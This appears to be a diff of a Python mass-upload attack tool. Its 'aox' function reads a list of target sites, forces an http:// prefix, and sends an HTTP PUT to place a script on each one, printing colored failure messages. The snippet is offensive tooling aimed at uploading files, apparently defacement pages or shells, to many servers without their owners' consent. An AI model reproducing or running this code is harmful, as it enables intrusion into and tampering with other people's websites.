@@ -49,8 +49,8 @@ def aox(script,target_file="target.txt"):
       for web in target:
          try:
             site = web.strip()
-            if site.startswith("https://") is False:
-               site = "https://" + site
+            if site.startswith("http://") is False:
+               site = "http://" + site
             req = s.put(site+"/"+script,data=op)
             if req.status_code < 200 or req.status_code >= 250:
                print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
